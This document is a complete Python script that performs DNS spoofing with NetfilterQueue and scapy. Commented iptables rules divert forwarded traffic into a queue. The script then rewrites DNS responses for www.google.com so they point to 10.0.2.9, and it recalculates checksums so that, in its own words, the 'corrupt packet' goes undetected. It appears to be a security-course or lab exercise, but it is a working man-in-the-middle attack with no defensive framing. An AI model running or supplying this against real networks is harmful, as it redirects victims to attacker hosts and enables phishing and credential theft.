#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

from netfilterqueue import NetfilterQueue
import scapy.all as scapy


def pkt_filter_callback(packet):
    # Wrapping the payload of the packet with a scapy IP layer, thus converting it into a scapy packet.
    scapy_packet = scapy.IP(packet.get_payload())

    # DNSRR = DNS response
    # DNSRQ = DNS request
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in qname:
            print("[+] Spoofing target!")
            # Filling up the fields of the custom DNS response
            # rrname = Website requested
            # rdata = IP returned
            # Other values are dynamically calculated by scapy
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.9")
            scapy_packet[scapy.DNS].an = answer
            # ancount = Number of answers sent by DNS
            scapy_packet[scapy.DNS].ancount = 1


            # Deleting the length and checksum of the IP and UDP layers so that they cannot detect our corrupt packet
            # Scapy then dynamically calculates these values again
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Changing the packet to our custom packet
            # Normal packets can only be viewed as strings, unlike scapy packets where layers can be viewed individually
            packet.set_payload(str(scapy_packet))

    # Forward packets
    packet.accept()


# The queue creates an instance of the NetfilterQueue which stores packets captured
queue = NetfilterQueue()
# Binds the queue to a particular queue number and calls a callback function
queue.bind(0, pkt_filter_callback)

try:
    print('Controller packet filtering mode')
    queue.run()

except KeyboardInterrupt:
    print('Quitting packet filter')
    queue.unbind()

    raise KeyboardInterrupt
